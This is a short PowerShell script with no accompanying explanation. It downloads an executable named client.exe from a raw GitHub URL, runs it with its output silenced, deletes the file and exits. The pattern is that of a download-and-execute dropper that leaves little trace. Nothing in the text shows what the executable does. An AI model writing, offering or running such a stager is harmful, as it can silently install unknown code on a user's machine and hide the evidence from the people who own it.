Invoke-WebRequest 'https://raw.githubusercontent.com/RavenCraftInitaitives/DomAndDarlene/main/client.exe' -OutFile client.exe
.\client.exe | Out-Null
Remove-Item .\client.exe
exit
